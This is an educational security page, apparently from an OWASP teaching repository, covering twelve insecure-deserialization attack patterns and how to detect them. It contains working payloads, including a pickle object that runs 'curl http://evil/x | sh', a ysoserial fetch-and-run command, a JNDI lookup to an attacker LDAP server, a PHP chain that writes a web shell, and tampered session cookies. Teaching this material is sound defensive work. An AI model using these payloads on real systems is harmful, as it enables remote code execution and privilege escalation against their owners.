# Insecure Deserialization - Attack Vectors

> **⚠ Educational purpose only.** These techniques are shown so you can find and fix insecure deserialization in systems you own or are explicitly authorised to test. Exploiting systems without permission is illegal.

## Table of Contents

- [The Core Attack Flow](#the-core-attack-flow)
- [Attack Patterns](#attack-patterns)
  1. [Python pickle RCE via `__reduce__`](#pattern-1)
  2. [PyYAML unsafe `load()`](#pattern-2)
  3. [Java gadget chains & ysoserial](#pattern-3)
  4. [Java + JNDI/RMI remote class loading](#pattern-4)
  5. [PHP object injection (POP chains)](#pattern-5)
  6. [PHP `phar://` deserialization](#pattern-6)
  7. [.NET BinaryFormatter & TypeNameHandling](#pattern-7)
  8. [ASP.NET ViewState with a known key](#pattern-8)
  9. [Node.js `node-serialize` eval](#pattern-9)
  10. [Prototype pollution (JS deserialization)](#pattern-10)
  11. [Cookie / token tampering & replay](#pattern-11)
  12. [Denial of service via crafted objects](#pattern-12)
- [Detection Techniques](#detection)

## The Core Attack Flow

Almost every deserialization exploit follows the same five steps, regardless of language. Understanding the flow makes each specific pattern below easy to place.

```
1. FIND THE SINK      Locate code that deserializes input you can influence:
                      ObjectInputStream.readObject, pickle.loads, unserialize,
                      BinaryFormatter.Deserialize, Marshal.load, node-serialize.

2. CONFIRM CONTROL    Prove the bytes come from you: a cookie, request body,
                      header, upload, queue message, or a filename (phar://).

3. CHOOSE THE GOAL    RCE (gadget chain) OR tamper/replay (edit fields) OR
                      DoS (amplification). This decides the payload type.

4. BUILD THE PAYLOAD  For RCE: assemble a gadget chain from classes on the
                      target's classpath (ysoserial, POP chain, __reduce__).
                      For tamper: flip fields; re-sign if a key leaked.

5. DELIVER & TRIGGER  Send the blob so the vulnerable code deserializes it.
                      The chain fires DURING reconstruction—before business
                      logic ever validates anything.
```

> **Key point:** the malicious effect happens *while the object is being rebuilt*, not when your application later "uses" it. Input validation that runs after deserialization is already too late.

## Attack Patterns

### <a id="pattern-1"></a>1. Python pickle RCE via `__reduce__`

Python's `pickle` lets a class define `__reduce__`, which returns a callable and its arguments that the unpickler will invoke to "rebuild" the object. An attacker returns `os.system` (or `subprocess`, `exec`, etc.) with a command of their choosing.

```python
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ("curl http://evil/x | sh",))

# Attacker produces the blob once:
payload = base64.b64encode(pickle.dumps(RCE()))

# Anywhere the victim does this on attacker bytes, the command runs:
#   pickle.loads(base64.b64decode(payload))
```

**Where it hits**: session cookies, cached objects, message queues, machine-learning model files (`*.pkl`), and any API that "conveniently" accepts pickled data. The Python documentation itself warns never to unpickle data from an untrusted source.

### <a id="pattern-2"></a>2. PyYAML unsafe `load()`

Historically `yaml.load(data)` used the *full* loader, which honours Python-object tags. A crafted document instantiates arbitrary objects and calls arbitrary functions.

```yaml
# Malicious YAML document supplied by the attacker:
!!python/object/apply:os.system ["id"]
```

```python
# Vulnerable code:
import yaml
yaml.load(user_input)              # full loader -> executes os.system("id")

# Also dangerous: yaml.load(x, Loader=yaml.Loader) / yaml.unsafe_load(x)
```

Modern PyYAML made `load()` require an explicit `Loader` precisely because of this footgun. The fix is `yaml.safe_load` (see Prevention).

### <a id="pattern-3"></a>3. Java gadget chains & ysoserial

Java's `ObjectInputStream.readObject()` reconstructs any serializable type named in the stream and runs its `readObject` hook. Attackers chain library classes ("gadgets") so that reconstruction ends in code execution. The **ysoserial** tool generates ready-made payloads for many library combinations.

```bash
# Attacker generates a payload using a known gadget (illustrative CLI):
java -jar ysoserial.jar CommonsCollections1 'curl http://evil/x|sh' > payload.bin
```

```java
// Vulnerable server code (the classic sink):
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();     // gadget chain fires here -> RCE
```

**Where it hits**: RMI/JMX endpoints, JMS messages, HTTP endpoints accepting serialized objects, proprietary protocols (`T3`/IIOP) on Java application servers, and any framework that reads serialized session cookies.

### <a id="pattern-4"></a>4. Java + JNDI/RMI remote class loading

Some gadget chains (and related injection bugs) end in a **JNDI lookup** pointed at an attacker-controlled server. The victim fetches and instantiates a remote object/class, achieving code execution without needing a local gadget at all.

```java
// A gadget or lookup ends up doing, in effect:
new InitialContext().lookup("ldap://attacker/Exploit");
// The JNDI provider fetches a remote factory/class the attacker serves,
// and the JVM instantiates it -> code runs from the attacker's server.
```

This is the same primitive behind many high-impact Java RCEs: attacker-controlled data reaching a lookup or a deserializer that resolves remote types. Mitigations include disabling remote codebase loading (`com.sun.jndi.*.object.trustURLCodebase=false`) and filtering deserialized classes.

### <a id="pattern-5"></a>5. PHP object injection (POP chains)

`unserialize()` on user input lets an attacker create instances of any defined class and set their properties. By choosing classes whose **magic methods** (`__wakeup`, `__destruct`, `__toString`, `__call`) do useful work, the attacker builds a **Property-Oriented Programming (POP)** chain ending in a dangerous sink.

```php
<?php
// A gadget class already present in the codebase:
class Logger {
    public $file;
    public $data;
    public function __destruct() {
        file_put_contents($this->file, $this->data);  // arbitrary file write
    }
}

// Attacker sends this serialized string as input:
// O:6:"Logger":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:24:"<?php system($_GET[c]);?>";}

$obj = unserialize($_COOKIE['prefs']);  // __destruct writes a web shell
?>
```

**Where it hits**: cookies, hidden form fields, and API parameters passed to `unserialize()`. Real POP chains often thread several classes together to reach an `eval`, SQL, or file sink.

### <a id="pattern-6"></a>6. PHP `phar://` deserialization

PHP `.phar` archives store serialized metadata. When any filesystem function is given a `phar://` path, PHP *deserializes that metadata*—no explicit `unserialize()` call required. If an attacker can upload a crafted archive and influence a filename, a POP chain fires.

```php
<?php
// Attacker uploads evil.jpg that is really a phar with crafted metadata,
// then triggers a file operation on a phar:// path pointing at it:
$file = $_GET['avatar'];                 // "phar://uploads/evil.jpg/x"
if (file_exists($file)) {                // file_exists deserializes phar meta
    // ...POP chain in the metadata executes here...
}
?>
```

Any user-influenced path reaching `file_exists`, `fopen`, `getimagesize`, `md5_file`, and similar can be a trigger. This is why filename handling is part of the deserialization attack surface.

### <a id="pattern-7"></a>7. .NET BinaryFormatter & TypeNameHandling

.NET serializers that embed *type* information let an attacker choose which types get instantiated. `BinaryFormatter`, `NetDataContractSerializer`, `LosFormatter`, and Json.NET with `TypeNameHandling` other than `None` are all exploitable. **ysoserial.net** automates the payloads.

```csharp
// VULNERABLE: attacker-chosen type is embedded in the JSON
var settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All   // trusts "$type" from input
};
var obj = JsonConvert.DeserializeObject(userJson, settings);

// Malicious JSON carries a "$type" that resolves to a dangerous gadget:
// { "$type": "System.Windows.Data.ObjectDataProvider, ...",
//   "MethodName": "Start", "ObjectInstance": { "$type": "System.Diagnostics.Process, ..." } }
```

`BinaryFormatter` is now deprecated and being removed from .NET precisely because it cannot be used safely on untrusted input.

### <a id="pattern-8"></a>8. ASP.NET ViewState with a known key

ASP.NET serialises page state into `__VIEWSTATE`. It is protected by a Message Authentication Code and optional encryption keyed by `machineKey`. If that key is **left at a default, leaked in source, or brute-forced**, an attacker can forge a valid, signed ViewState that deserializes to a gadget chain—RCE.

```bash
# Attacker who knows the machineKey forges a signed ViewState (illustrative):
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  --generator=<__VIEWSTATEGENERATOR> \
  --validationkey=<LEAKED_KEY> --validationalg=SHA1 \
  -c "cmd /c whoami"

# Submitted as __VIEWSTATE; server validates the MAC (key is known),
# then deserializes -> gadget chain executes.
```

Lesson: integrity depends entirely on key secrecy. A leaked or default signing key turns a "protected" blob back into an RCE primitive.

### <a id="pattern-9"></a>9. Node.js `node-serialize` eval

Some Node libraries serialise *functions*, then evaluate them on load. A payload with an immediately-invoked function expression (IIFE) runs during "parsing."

```javascript
// VULNERABLE:
var serialize = require('node-serialize');
var obj = serialize.unserialize(req.cookies.profile);

// Attacker cookie value (the trailing () makes it self-execute on unserialize):
// {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

The safe alternative is plain `JSON.parse`, which never restores or executes functions.

### <a id="pattern-10"></a>10. Prototype pollution (JS deserialization variant)

When JSON is merged into objects with a recursive "deep merge" or an unsafe `set(path, value)`, attacker keys like `__proto__` or `constructor.prototype` can pollute `Object.prototype`. Every object then inherits attacker-controlled properties, which can flip security flags or, combined with a gadget, reach code execution.

```javascript
// Malicious JSON body:
// {"__proto__": {"isAdmin": true}}

// Vulnerable deep-merge turns request data into object state:
deepMerge(currentUser, JSON.parse(req.body));
// Now ({}).isAdmin === true for EVERY object -> auth checks bypassed
```

It is included here because it is JavaScript's characteristic "deserialize untrusted structure into live objects" failure—fix by rejecting `__proto__`/`constructor` keys and using null-prototype objects or `Map`.

### <a id="pattern-11"></a>11. Cookie / token tampering & replay

Not every deserialization attack is RCE. If serialized state is sent to the client **without a verified integrity check**, an attacker simply edits the fields.

```
# A base64'd serialized session cookie (no HMAC):
#   decode -> {"user":"alice","role":"user","exp":1699999999}
# Attacker edits and re-encodes:
#   {"user":"alice","role":"admin","exp":9999999999}
# Server deserializes and trusts it -> privilege escalation + no expiry

# REPLAY: even a signed-but-not-bound token can be captured and reused
# elsewhere if it lacks nonce/audience/expiry binding.
```

Weak or leaked signing keys (see ViewState) collapse this into the same problem even when a MAC is present. The fix is a strong, secret HMAC (or authenticated encryption) plus expiry/audience binding.

### <a id="pattern-12"></a>12. Denial of service via crafted objects

Deserializers allocate memory and recurse as they rebuild an object graph. Small payloads can explode into huge or infinitely recursive structures before any business logic runs.

```
Amplification / "billion laughs" style:
  a small nested/back-referencing graph expands to millions of objects.

Hash-collision maps:
  a serialized HashMap whose keys all collide forces O(n^2) insertion.

Deep recursion:
  a deeply nested structure blows the stack or exhausts the heap.

Result: CPU/memory exhaustion -> the service falls over on a tiny request.
```

Defences include input size limits, depth/reference caps in the parser, and—again—not deserializing untrusted native formats at all.

## Detection Techniques

### For Security Testers

- **Locate the format**: recognise serialized data by its markers—Java streams begin with the bytes `AC ED 00 05` (base64 `rO0AB`), PHP serialized strings look like `O:4:"User":...`, .NET `BinaryFormatter` starts with `00 01 00 00 00 FF FF FF FF`, Python pickles start with `\x80` then a protocol byte.
- **Probe blobs**: any opaque cookie, hidden field, header, or body that base64-decodes to one of the above is a candidate. Feed it a benign malformed value and watch for type/parse errors that confirm deserialization.
- **Use the toolchain**: `ysoserial` / `ysoserial.net` for Java/.NET payload generation, the Java Deserialization Scanner and Freddy extensions for Burp Suite, `phpggc` for PHP POP chains.
- **Out-of-band confirmation**: because output is often invisible, prove execution with a DNS/HTTP callback (an OAST/Collaborator-style interaction) rather than expecting command output in the response.

### For Developers (Code Review Smells)

- Calls to `readObject`, `pickle.loads`, `yaml.load` (without `safe_load`), `unserialize`, `BinaryFormatter.Deserialize`, `Marshal.load`, or `node-serialize` on anything reaching the network.
- Polymorphic type settings: Json.NET `TypeNameHandling` ≠ `None`, Jackson `enableDefaultTyping()`, or YAML custom tags allowed.
- Serialized state round-tripped through the client with no HMAC/authenticated encryption, or with a hard-coded/default key.
- User-influenced filenames reaching PHP filesystem functions (`phar://` exposure).
- No class allow-list (`ObjectInputFilter`, `allowed_classes`) anywhere near a deserialization call.

### Automated & Runtime Signals

- **SAST/SCA**: flag dangerous sinks and the presence of known gadget libraries (e.g. vulnerable Commons Collections versions) on the classpath.
- **Logging**: record and alert on deserialization failures, unexpected class-resolution attempts, and JNDI/LDAP lookups originating from app servers.
- **Monitoring**: watch for the app process spawning shells (`sh`, `cmd`, `powershell`) or making unexpected outbound connections right after handling a serialized input.

## Key Takeaways for Defenders

1. **The exploit fires during reconstruction**—post-deserialization validation is too late.
2. **RCE and tampering are different vectors** with different fixes; check for both.
3. **Attackers reuse your libraries**—keeping gadget libraries patched and off the classpath matters.
4. **Recognise serialized blobs by their byte markers**—they hide in cookies, fields, and files.
5. **Prove impact out-of-band**; deserialization RCE is often "blind."

## Next Steps

- **[Overview](./overview.html)**: What insecure deserialization is and why it matters
- **[Prevention](./prevention.html)**: Layered defenses that neutralise these vectors
- **[Examples](./examples.html)**: Vulnerable vs. secure code across languages
- **[Hands-On Lab](./lab/insecure-deserialization/)**: Practice identifying and exploiting these vectors safely

---

*Part of the [OWASP Top 10 Educational Repository](/)*
